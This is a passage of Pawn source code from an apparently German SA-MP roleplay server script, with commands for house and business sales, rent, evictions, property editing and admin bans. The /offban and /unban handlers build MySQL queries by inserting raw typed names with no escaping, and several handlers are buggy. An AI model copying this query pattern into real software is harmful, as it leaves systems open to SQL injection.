                PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                format(string, sizeof(string), "~w~Du hast das Geschäft verkauft");
				GameTextForPlayer(playerid, string, 10000, 3);
          		format(string, sizeof(string), "==== [sBizz ID: %d] ====\nName: %s\nBesitzer: %s\nPreis: %d$\nEintritt: %d$\nProdukte: %d / %d",sbiz,SBizzInfo[sbiz][sbMessage],SBizzInfo[sbiz][sbOwner],SBizzInfo[sbiz][sbBuyPrice],SBizzInfo[sbiz][sbEntranceCost],SBizzInfo[sbiz][sbProducts],SBizzInfo[sbiz][sbMaxProducts]);
           		Update3DTextLabelText(SBizzInfo[sbiz][sB_text],COLOR_YELLOW,string);
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "AdmCmd: %s hat das SBizz: %d verkauft!",sendername, sbiz);
                ABroadCast(COLOR_LIGHTRED,string,1);
                OnPropUpdate_sb(sbiz);
                return 1;
            }
            else
            {
                SendClientMessage(playerid, COLOR_RED, "Du bist kein Administrator!");
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/asellhouse", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            GetPlayerName(playerid, playername, sizeof(playername));
            tmp = strtoknew(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_RED, "FEHLER: /asellhouse [houseid]");
                return 1;
            }
            new house = strval(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 2001)
            {
                HouseInfo[house][hHel] = 0;
                HouseInfo[house][hArm] = 0;
//                HouseInfo[house][hHealthx] = 0;
//                HouseInfo[house][hHealthy] = 0;
//                HouseInfo[house][hHealthz] = 0;
//                HouseInfo[house][hArmourx] = 0;
//                HouseInfo[house][hArmoury] = 0;
//                HouseInfo[house][hArmourz] = 0;
                HouseInfo[house][hLock] = 1;
                HouseInfo[house][hOwned] = 0;
//                Reload3DTexte();
                strmid(HouseInfo[house][hOwner], "Zu Verkaufen", 0, strlen("Zu Verkaufen"), 255);
                PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                format(string, sizeof(string), "~w~Du hast dieses Geschaeft verkauft", HouseInfo[house][hValue]);
                GameTextForPlayer(playerid, string, 10000, 3);
//                format(string, sizeof(string), "==== [HausID: %d] ====\nBesitzer: %s\nPreis: %d$\nMiete: %d$\n/buyhouse zum kaufen",house,HouseInfo[house][hOwner],HouseInfo[house][hValue],HouseInfo[house][hRent]);
//                Update3DTextLabelText(HouseInfo[house][h_text],COLOR_YELLOW,string);
                GetPlayerName(playerid, sendername, sizeof(sendername));
                format(string, sizeof(string), "AdmCmd: %s hat das Haus: %d verkauft!",sendername ,house);
                ABroadCast(COLOR_LIGHTRED,string,1);
                SaveProperty(house);
                return 1;
            }
            else
            {
                SendClientMessage(playerid, COLOR_RED, "Du bist kein Administrator!");
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/sellhouse", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            GetPlayerName(playerid, playername, sizeof(playername));
            if(PlayerInfo[playerid][pHouseKey] == 999)
            {
                SendClientMessage(playerid, COLOR_WHITE, "Du besitzt kein Haus was du verkaufen kannst.");
                return 1;
            }
            if(PlayerInfo[playerid][pHouseKey] != 999 && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouseKey]][hOwner], true) == 0)
            {
                new house = PlayerInfo[playerid][pHouseKey], hauspreis = floatround(HouseInfo[house][hValue]/2);// Hälfte
		        FraktionsKasse[6] -= hauspreis;// Regierung
			    GivePlayerMoneySave(playerid, hauspreis);
//                PlayerMoney[playerid] = PlayerMoney[playerid]+hauspreis;
                HouseInfo[house][hHel] = 0;
                HouseInfo[house][hArm] = 0;
//                HouseInfo[house][hHealthx] = 0;
//                HouseInfo[house][hHealthy] = 0;
//                HouseInfo[house][hHealthz] = 0;
//                HouseInfo[house][hArmourx] = 0;
//                HouseInfo[house][hArmoury] = 0;
//                HouseInfo[house][hArmourz] = 0;
                HouseInfo[house][hLock] = 1;
                HouseInfo[house][hOwned] = 0;
                GetPlayerName(playerid, sendername, sizeof(sendername));
                strmid(HouseInfo[house][hOwner], "Zu Verkaufen", 0, strlen("Zu Verkaufen"), 255);
                ConsumingMoney[playerid] = 1;
                PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                format(string, sizeof(string), "~w~Gratulation~n~ Du hast dein Haus verkauft");
                GameTextForPlayer(playerid, string, 10000, 3);
                PlayerInfo[playerid][pHouseKey] = 999;
                if(PlayerInfo[playerid][pLocal] == house)
                {
                    SetPlayerInterior(playerid,0);
                    SetPlayerPos(playerid,HouseInfo[house][hEntrancex],HouseInfo[house][hEntrancey],HouseInfo[house][hEntrancez]);
                    PlayerInfo[playerid][pInt] = 0;
                }
//				DestroyPickup(HouseInfo[house][hPickup]);// NEW
                SaveProperty(house);
//                format(string, sizeof(string), "==== [HausID: %d] ====\nBesitzer: %s\nPreis: %d$\nMiete: %d$\n/buyhouse zum kaufen",house,HouseInfo[house][hOwner],HouseInfo[house][hValue],HouseInfo[house][hRent]);
//                Update3DTextLabelText(HouseInfo[house][h_text],COLOR_YELLOW,string);
                SaveProperty(house);
                SaveMysqlPlayer(playerid);
                return 1;
            }
            else
            {
                SendClientMessage(playerid, COLOR_WHITE, "Du besitzt kein Haus was du verkaufen kannst.");
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/houseupgrade", true) == 0 || strcmp(cmd, "/hu", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new house = PlayerInfo[playerid][pHouseKey];
            GetPlayerName(playerid, playername, sizeof(playername));
            if (house != 999 && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouseKey]][hOwner], true) == 0)
            {
                tmp = strtoknew(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_RED, "FEHLER: /houseupgrade [Nummer]");
                    SendClientMessage(playerid, COLOR_GRAD1, "-=-=-=-=- Haus Upgrades -=-=-=-=-");
                    SendClientMessage(playerid, COLOR_GRAD2, "| 1: Lebensenergie Erweiterung $500000");
//                    SendClientMessage(playerid, COLOR_GRAD3, "| 2: Rüstungs Erweiterung $10000");
                    return 1;
                }
                new item = strval(tmp);
                switch (item)
                {
                    case 1:
                    {
						if(GetPlayerMoneySave(playerid) < 500000)
                        {
                            SendClientMessage(playerid, COLOR_GRAD5, "Du hast nicht genug Geld, um das zu kaufen.");
                            return 1;
                        }
	                    HouseInfo[house][hHel] = 1;
						GivePlayerMoneySave(playerid,-500000);
//                        PlayerMoney[playerid] = PlayerMoney[playerid]-500000;
                        SBizzInfo[6][sbTill] += 2500;//heal business
                        ExtortionSBiz(6, 50000);
                        SBizzInfo[6][sbProducts]--;
                        PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                        SendClientMessage(playerid, COLOR_GRAD5, "Du kannst dich jetzt zu Hause heilen, Gib dafür /heal ein.");
                    }
/*
                    case 2:
                    {

						if(GetPlayerMoneySave(playerid) < 10000)
                        {
                            SendClientMessage(playerid, COLOR_GRAD5, "Du hast nicht genug Geld, um das zu Kaufen.");
                            return 1;
                        }
                        HouseInfo[house][hArm] = 1;
						GivePlayerMoneySave(playerid,-10000);
//                        PlayerMoney[playerid] = PlayerMoney[playerid]-10000;
                        SBizzInfo[6][sbTill] += 5000;//heal buisness
                        ExtortionSBiz(6, 10000);
                        SBizzInfo[6][sbProducts]--;
                        PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                        SendClientMessage(playerid, COLOR_GRAD5, "Du kannst jetzt zu Hause deine Rüstung auffüllen, Gib dazu /heal ein.");
                    }
*/
                }
                SaveProperty(house);
                return 1;
            }
            else
            {
                SendClientMessage(playerid, COLOR_GRAD2, "   Dir gehört kein Haus!");
                return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/setrent", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new bouse = PlayerInfo[playerid][pHouseKey];
            GetPlayerName(playerid, playername, sizeof(playername));
            if (bouse != 999 && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouseKey]][hOwner], true) == 0)
            {
                tmp = strtoknew(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_RED, "FEHLER: /setrent [Preis]");
                    return 1;
                }
                if(strval(tmp) < 250 || strval(tmp) > 1500)
                {
                    SendClientMessage(playerid, COLOR_WHITE, "Minimale miete ist $250, Maximale miete ist $1500.");
                    return 1;
                }
                HouseInfo[bouse][hRent] = strval(tmp);
                SaveProperty(bouse);
                format(string, sizeof(string), "Hausmiete auf $%d gesetzt.", HouseInfo[bouse][hRent]);
                SendClientMessage(playerid, COLOR_WHITE, string);
                return 1;
            }
            else
            {
                SendClientMessage(playerid, COLOR_GRAD2, "   Dir gehört kein Haus.");
                return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/evictall", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new bouse = PlayerInfo[playerid][pHouseKey];
            if (bouse != 999 && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouseKey]][hOwner], true) == 0)
            {
                for(new i = 0; i < MAX_PLAYERS; i++)
                {
                    if(IsPlayerConnected(i))
                    {
                        if(i != playerid)
                        {
                            if (PlayerInfo[i][pHouseKey] == PlayerInfo[playerid][pHouseKey] )
                            {
                                SendClientMessage(i, COLOR_WHITE, "Du wurdest aus dem Haus geschmissen.");
                                SendClientMessage(playerid, COLOR_WHITE, "Jeder wurde aus seinem Haus geschmissen.");
                                PlayerInfo[i][pHouseKey] = 999;
                                return 1;
                            }
                        }
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GRAD2, "   Dir gehört kein Haus !");
                return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/evict", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new bouse = PlayerInfo[playerid][pHouseKey];
            GetPlayerName(playerid, playername, sizeof(playername));
            if (bouse != 999 && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouseKey]][hOwner], true) == 0)
            {
                tmp = strtoknew(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_RED, "FEHLER: /evict [playerid]");
                }
                new target;
                //target = strval(tmp);
                target = ReturnUser(tmp);
                if (target == playerid)
                {
                    SendClientMessage(target, COLOR_WHITE, "Du kannst dich nicht selber rausschmeißen.");
                    return 1;
                }
                if(IsPlayerConnected(target))
                {
                    if(target != INVALID_PLAYER_ID)
                    {
                        if(PlayerInfo[target][pHouseKey] == PlayerInfo[playerid][pHouseKey])
                        {
                            SendClientMessage(target, COLOR_WHITE, "Du wurdest rausgeschmissen!");
                            SendClientMessage(playerid, COLOR_WHITE, "Spieler wurde rausgeschmissen!");
                            PlayerInfo[target][pHouseKey] = 999;
                            return 1;
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_WHITE, "Der Spieler hat dein Haus nicht gemietet !");
                            return 1;
                        }
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GRAD2, "   Dir gehört kein Haus !");
                return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/setrentable", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new bouse = PlayerInfo[playerid][pHouseKey];
            GetPlayerName(playerid, playername, sizeof(playername));
            if (bouse != 999 && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouseKey]][hOwner], true) == 0)
            {
                tmp = strtoknew(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_RED, "FEHLER: /setrentable [0/1]");
                }
                HouseInfo[bouse][hRentabil] = strval(tmp);
                SaveProperty(bouse);
                format(string, sizeof(string), "Mietbar des Hauses wurde auf %d gesetzt.", HouseInfo[bouse][hRentabil]);
                SendClientMessage(playerid, COLOR_WHITE, string);
                return 1;
            }
            else
            {
                SendClientMessage(playerid, COLOR_GRAD2, "   Dir gehört kein Haus !");
                return 1;
            }
        }
        return 1;
    }








	if(strcmp(cmd, "/edit", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
		{
			if(PlayerInfo[playerid][pAdmin] < 2002)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "** INFO ** Das ist ein Adminbefehl, Du bist kein Admin!");
				return 1;
			}
			new x_job[256];
			x_job = strtoknew(cmdtext, idx);
			if(!strlen(x_job)) {
                SendClientMessage(playerid, COLOR_WHITE, "=========== |Haus bearbeiten] ===========");
                SendClientMessage(playerid, COLOR_WHITE, "=========== |Biz  bearbeiten| ===========");
                SendClientMessage(playerid, COLOR_WHITE, "=========== |Tanke bearbeiten| ===========");
                SendClientMessage(playerid, COLOR_RED, "FEHLER: /edit [Verfügbar] [Höhe])");
                SendClientMessage(playerid, COLOR_GREY, "Verfügbar: Level, Preis, Funds, Produkte, Name");
				return 1;
			}
			for(new i = 0; i < sizeof(HouseInfo); i++)
			{
				if (IsPlayerInRangeOfPoint(playerid,3.0,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez]))
				{
					format(string, sizeof(string), "Haus ID: %d", i);
					SendClientMessage(playerid, COLOR_GRAD2, string);
				    if(strcmp(x_job,"level",true) == 0)
				    {
				    	tmp = strtoknew(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /edit [name] [ammount]");
							return 1;
						}
						new proplev = strval(tmp);
						if(proplev < 1) return 1;
						HouseInfo[i][hLevel] = proplev;
                        SaveProperty(i);
					}
				    if(strcmp(x_job,"preis",true) == 0)
				    {
				    	tmp = strtoknew(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /edit [name] [ammount]");
							return 1;
						}
						new proplev = strval(tmp);
						if(proplev < 1) return 1;
						HouseInfo[i][hValue] = proplev;
                        SaveProperty(i);
					}
					else if(strcmp(x_job,"name",true) == 0)
    				{
    					new length = strlen(cmdtext);
						while ((idx < length) && (cmdtext[idx] <= ' '))
						{
							idx++;
						}
						new offset = idx;
						new result[64];
						while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
						{
							result[idx - offset] = cmdtext[idx];
							idx++;
						}
						result[idx - offset] = EOS;
						if(!strlen(result))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /edit name [text]");
							return 1;
						}
						strmid(HouseInfo[i][hDiscription], result, 0, strlen(result), 255);
                        SaveProperty(i);
					}
				}
			}
			for(new i = 0; i < sizeof(BizzInfo); i++)
			{
				if (IsPlayerInRangeOfPoint(playerid,3.0,BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ]))
				{

					format(string, sizeof(string), "Bizz ID: %d", i);
					SendClientMessage(playerid, COLOR_GRAD2, string);
				    if(strcmp(x_job,"level",true) == 0)
				    {
				    	tmp = strtoknew(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /edit [name] [ammount]");
							return 1;
						}
						new proplev = strval(tmp);
						if(proplev < 1) return 1;
						BizzInfo[i][bLevelNeeded] = proplev;
                        OnPropUpdate_b(i);
					}

				    if(strcmp(x_job,"preis",true) == 0)
				    {
				    	tmp = strtoknew(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /edit [name] [ammount]");
							return 1;
						}
						new proplev = strval(tmp);
						if(proplev < 1) return 1;
						BizzInfo[i][bBuyPrice] = proplev;
                        OnPropUpdate_b(i);
					}

				    if(strcmp(x_job,"funds",true) == 0)
				    {
				    	tmp = strtoknew(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /edit [name] [ammount]");
							return 1;
						}
						new proplev = strval(tmp);
						if(proplev < 1) return 1;
						BizzInfo[i][bTill] = proplev;
                        OnPropUpdate_b(i);
					}

				    if(strcmp(x_job,"Produkte",true) == 0)
				    {
				    	tmp = strtoknew(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /edit [name] [ammount]");
							return 1;
						}
						new proplev = strval(tmp);
						if(proplev < 1) return 1;
						BizzInfo[i][bProducts] = proplev;
                        OnPropUpdate_b(i);
					}

					else if(strcmp(x_job,"name",true) == 0)
    				{
    					new length = strlen(cmdtext);
						while ((idx < length) && (cmdtext[idx] <= ' '))
						{
							idx++;
						}
						new offset = idx;
						new result[64];
						while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
						{
							result[idx - offset] = cmdtext[idx];
							idx++;
						}
						result[idx - offset] = EOS;
						if(!strlen(result))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /edit name [text]");
							return 1;
						}
						strmid(BizzInfo[i][bMessage], result, 0, strlen(result), 255);
                        OnPropUpdate_b(i);
					}
				}
			}
			for(new i = 0; i < sizeof(TankeInfo); i++)
			{
				if (IsPlayerInRangeOfPoint(playerid,3.0,TankeInfo[i][tEntranceX], TankeInfo[i][tEntranceY], TankeInfo[i][tEntranceZ]))
				{
					format(string, sizeof(string), "Tankstellen ID: %d", i);
					SendClientMessage(playerid, COLOR_GRAD2, string);
				    if(strcmp(x_job,"level",true) == 0)
				    {
				    	tmp = strtoknew(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /edit [name] [ammount]");
							return 1;
						}
						new proplev = strval(tmp);
						if(proplev < 1) return 1;
						TankeInfo[i][tLevelNeeded] = proplev;
					}
				    if(strcmp(x_job,"entrance",true) == 0)
				    {
				    	tmp = strtoknew(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /edit [name] [ammount]");
							return 1;
						}
						new proplev = strval(tmp);
						if(proplev < 1) return 1;
						TankeInfo[i][tEntranceCost] = proplev;
					}
				    if(strcmp(x_job,"products",true) == 0)
				    {
				    	tmp = strtoknew(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /edit [name] [ammount]");
							return 1;
						}
						new proplev = strval(tmp);
						if(proplev < 1) return 1;
						TankeInfo[i][tProducts] = proplev;
					}


					else if(strcmp(x_job,"price",true) == 0)
				    {
				    	tmp = strtoknew(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /edit [name] [ammount]");
							return 1;
						}
						new proplev = strval(tmp);
						if(proplev < 1) return 1;
						TankeInfo[i][tBuyPrice] = proplev;
					}
					else if(strcmp(x_job,"name",true) == 0)
    				{
    					new length = strlen(cmdtext);
						while ((idx < length) && (cmdtext[idx] <= ' '))
						{
							idx++;
						}
						new offset = idx;
						new result[64];
						while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
						{
							result[idx - offset] = cmdtext[idx];
							idx++;
						}
						result[idx - offset] = EOS;
						if(!strlen(result))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /edit name [text]");
							return 1;
						}
						strmid(TankeInfo[i][tMessage], result, 0, strlen(result), 255);
					}
					OnPropUpdate_t(i);
				}
			}

			for(new i = 0; i < sizeof(FrakInfo); i++)
			{
				if (IsPlayerInRangeOfPoint(playerid,3.0,FrakInfo[i][fEntranceX], FrakInfo[i][fEntranceY], FrakInfo[i][fEntranceZ]))
				{

					format(string, sizeof(string), "Frak ID: %d", i);
					SendClientMessage(playerid, COLOR_GRAD2, string);



					if(strcmp(x_job,"name",true) == 0)
    				{
    					new length = strlen(cmdtext);
						while ((idx < length) && (cmdtext[idx] <= ' '))
						{
							idx++;
						}
						new offset = idx;
						new result[64];
						while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
						{
							result[idx - offset] = cmdtext[idx];
							idx++;
						}
						result[idx - offset] = EOS;
						if(!strlen(result))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /edit name [text]");
							return 1;
						}
						strmid(FrakInfo[i][fMessage], result, 0, strlen(result), 255);
                        OnPropUpdate_f(i);
					}
				}
			}
			/*
			for(new i = 0; i < sizeof(SBizzInfo); i++)
            {
                if (IsPlayerInRangeOfPoint(playerid,3,SBizzInfo[i][sbEntranceX], SBizzInfo[i][sbEntranceY], SBizzInfo[i][sbEntranceZ]))
                {
                    format(string, sizeof(string), "SBiz: %d", i);
                    SendClientMessage(playerid, COLOR_GRAD2, string);
                    if(proplev > 0)
                    {
                        if(strcmp(x_job,"Level",true) == 0)
                        {
                            SBizzInfo[i][sbLevelNeeded] = proplev;
                        }
                        else if(strcmp(x_job,"Preis",true) == 0)
                        {
                            SBizzInfo[i][sbBuyPrice] = proplev;
                        }
                        else if(strcmp(x_job,"funds",true) == 0)
                        {
                            SBizzInfo[i][sbTill] = proplev;
                        }
                        else if(strcmp(x_job,"Produkte",true) == 0)
                        {
                            SBizzInfo[i][sbProducts] = proplev;
                        }
						else if(strcmp(x_job,"Name",true) == 0)
	    				{
							SBizzInfo[i][sbMessage] = proplev;
						}
                    }
                    OnPropUpdate_sb(i);
                }
            }*/
			format(string, sizeof(string), "Du hast die/den %s eingestellt.", x_job);
			SendClientMessage(playerid, COLOR_WHITE, string);
			return 1;
		}
		return 1;
	}






    if(strcmp(cmd, "/editsbiz", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] < 2002)
            {
                SendClientMessage(playerid, COLOR_RED, "Du bist kein Administrator!");
                return 1;
            }
            new x_job[256];
            x_job = strtoknew(cmdtext, idx);
            if(!strlen(x_job)) {
                SendClientMessage(playerid, COLOR_WHITE, "=========== |Haus bearbeiten] ===========");
                SendClientMessage(playerid, COLOR_WHITE, "=========== |Biz  bearbeiten| ===========");
                SendClientMessage(playerid, COLOR_WHITE, "=========== |Tanke bearbeiten| ===========");
                SendClientMessage(playerid, COLOR_RED, "FEHLER: /edit [Verfügbar] [Höhe])");
                SendClientMessage(playerid, COLOR_GREY, "Verfügbar: Level, Preis, Funds, Produkte, Name");
                return 1;
            }
            tmp = strtoknew(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_RED, "FEHLER: /edit [Name] [Höhe]");
                return 1;
            }
            new proplev = strval(tmp);
            //if(strcmp(x_job,"car",true) == 0)
            for(new i = 0; i < sizeof(HouseInfo); i++)
            {
                if (IsPlayerInRangeOfPoint(playerid,3,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez]))
                {
                    format(string, sizeof(string), "House: %d", i);
                    GetPlayerName(playerid,sendername, sizeof(sendername));
                    SendClientMessage(playerid, COLOR_GRAD2, string);
                    if(proplev > 0)
                    {
                        if(strcmp(x_job,"Level",true) == 0)
                        {
                            HouseInfo[i][hLevel] = proplev;
                            format(string, sizeof(string), "%s hat das Level des Hauses %d auf %d geändert",sendername, i, proplev);
                            ABroadCast(COLOR_LIGHTRED,string,1);
                            SaveProperty(i);
                        }
                        else if(strcmp(x_job,"Preis",true) == 0)
                        {
                            HouseInfo[i][hValue] = proplev;
                            format(string, sizeof(string), "%s hat den Preis des Hauses %d auf %d$ geändert",sendername, i, proplev);
                            ABroadCast(COLOR_LIGHTRED,string,1);
                            SaveProperty(i);
                        }
						else if(strcmp(x_job,"Name",true) == 0)
	    				{
							HouseInfo[i][hDiscription] = proplev;
                            SaveProperty(i);
						}
                    }
                }
            }
            for(new i = 0; i < sizeof(BizzInfo); i++)
            {
                if (IsPlayerInRangeOfPoint(playerid,3,BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ]))
                {
                    format(string, sizeof(string), "Biz: %d", i);
                    SendClientMessage(playerid, COLOR_GRAD2, string);
                    if(proplev > 0)
                    {
                        if(strcmp(x_job,"Level",true) == 0)
                        {
                            BizzInfo[i][bLevelNeeded] = proplev;
                        }
                        else if(strcmp(x_job,"Preis",true) == 0)
                        {
                            BizzInfo[i][bBuyPrice] = proplev;
                        }
                        else if(strcmp(x_job,"funds",true) == 0)
                        {
                            BizzInfo[i][bTill] = proplev;
                        }
                        else if(strcmp(x_job,"Produkte",true) == 0)
                        {
                            BizzInfo[i][bProducts] = proplev;
                        }
						else if(strcmp(x_job,"Name",true) == 0)
	    				{
							BizzInfo[i][bMessage] = proplev;
						}
                        OnPropUpdate_b(i);
                    }
                }
            }
            for(new i = 0; i < sizeof(SBizzInfo); i++)
            {
                if (IsPlayerInRangeOfPoint(playerid,3,SBizzInfo[i][sbEntranceX], SBizzInfo[i][sbEntranceY], SBizzInfo[i][sbEntranceZ]))
                {
                    format(string, sizeof(string), "SBiz: %d", i);
                    SendClientMessage(playerid, COLOR_GRAD2, string);
                    if(proplev > 0)
                    {
                        if(strcmp(x_job,"Level",true) == 0)
                        {
                            SBizzInfo[i][sbLevelNeeded] = proplev;
                        }
                        else if(strcmp(x_job,"Preis",true) == 0)
                        {
                            SBizzInfo[i][sbBuyPrice] = proplev;
                        }
                        else if(strcmp(x_job,"funds",true) == 0)
                        {
                            SBizzInfo[i][sbTill] = proplev;
                        }
                        else if(strcmp(x_job,"Produkte",true) == 0)
                        {
                            SBizzInfo[i][sbProducts] = proplev;
                        }
						else if(strcmp(x_job,"Name",true) == 0)
	    				{
							SBizzInfo[i][sbMessage] = proplev;
						}
                    }
                    OnPropUpdate_sb(i);
                }
            }
			for(new i = 0; i < sizeof(TankeInfo); i++)
			{
				if (IsPlayerInRangeOfPoint(playerid,3.0,TankeInfo[i][tEntranceX], TankeInfo[i][tEntranceY], TankeInfo[i][tEntranceZ]))
				{
					format(string, sizeof(string), "Tankstellen ID: %d", i);
					SendClientMessage(playerid, COLOR_GRAD2, string);
				    if(strcmp(x_job,"level",true) == 0)
				    {
						TankeInfo[i][tLevelNeeded] = proplev;
					}
					else if(strcmp(x_job,"preis",true) == 0)
				    {
						TankeInfo[i][tBuyPrice] = proplev;
					}
					else if(strcmp(x_job,"name",true) == 0)
    				{
						TankeInfo[i][tMessage] = proplev;
					}
					OnPropUpdate_t(i);
				}
			}
            format(string, sizeof(string), "Du hast die/den %s eingestellt.", x_job);
            SendClientMessage(playerid, COLOR_WHITE, string);
        }
        return 1;
    }
	if(strcmp(cmd, "/offban", true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
			if(PlayerInfo[playerid][pAdmin] >= 1337)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				new length = strlen(cmdtext);
				while ((idx < length) && (cmdtext[idx] <= ' '))
			{
			idx++;
		}
		new offset = idx;
		new result[90];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
	{
	result[idx - offset] = cmdtext[idx];
	idx++;
	}
	result[idx - offset] = EOS;
	if(!strlen(result))
	{
	SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /offban [GetName]");
	return 1;
	}
    new query6[200];
    format(query6,sizeof(query6),"UPDATE accounts SET gebannt = '1' WHERE name = '%s'",result);
	//mysql_function_query(mysqlcon,query6, false, "", "");
	mysql_pquery(mysqlcon, query6);

    format(query6,sizeof(query6),"UPDATE accounts SET bangrund = 'Offline-Ban' WHERE name = '%s'",result);
//	mysql_function_query(mysqlcon,query6, false, "", "");
    mysql_pquery(mysqlcon, query6);

    format(query6,sizeof(query6),"UPDATE accounts SET banadmin = '%s' WHERE name = '%s'",GetName(playerid),result);
//	mysql_function_query(mysqlcon,query6, false, "", "");
    mysql_pquery(mysqlcon, query6);

	format(string, sizeof(string), "%s wurde von %s gebannt, Grund: Offline-Ban", result, sendername);
	SendClientMessageToAll(COLOR_RED, string);

	}
	else
	{
	SendClientMessage(playerid, COLOR_GREY, " Du bist kein Admin!");
	}
	}//not connected
	return 1;
	}
	if(strcmp(cmd, "/unban", true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
			if(PlayerInfo[playerid][pAdmin] >= 3)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				new length = strlen(cmdtext);
				while ((idx < length) && (cmdtext[idx] <= ' '))
			{
			idx++;
		}
		new offset = idx;
		new result[90];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
	{
	result[idx - offset] = cmdtext[idx];
	idx++;
	}
	result[idx - offset] = EOS;
	if(!strlen(result))
	{
	SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /unban [GetName]");
	return 1;
	}
    new query6[200];
    format(query6,sizeof(query6),"UPDATE accounts SET gebannt = '0' WHERE name = '%s'",result);
	//mysql_function_query(mysqlcon,query6, false, "", "");
	mysql_pquery(mysqlcon, query6);

	format(string, sizeof(string), "%s wurde von %s entbannt, Grund: Offline-Ban", result, sendername);
	SendClientMessageToAll(COLOR_RED, string);

	}
	else
	{
	SendClientMessage(playerid, COLOR_GREY, " Du bist kein Admin!");
	}
	}//not connected
	return 1;
	}
	if(strcmp(cmd, "/ann", true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
			if(PlayerInfo[playerid][pAdmin] >= 3)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				new length = strlen(cmdtext);
				while ((idx < length) && (cmdtext[idx] <= ' '))
			{
			idx++;
		}
		new offset = idx;
		new result[90];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
	{
	result[idx - offset] = cmdtext[idx];
	idx++;
	}
	result[idx - offset] = EOS;
	if(!strlen(result))
	{
	SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /ann [text]");
	return 1;
	}
		if(PlayerInfo[playerid][pAdmin] == 4)
		{
		format(string, sizeof(string), "(( * Supporter %s: %s ))", sendername, result);// (( *
		OOCNews(RED, string);
		}
		else if(PlayerInfo[playerid][pAdmin] == 1337)
		{
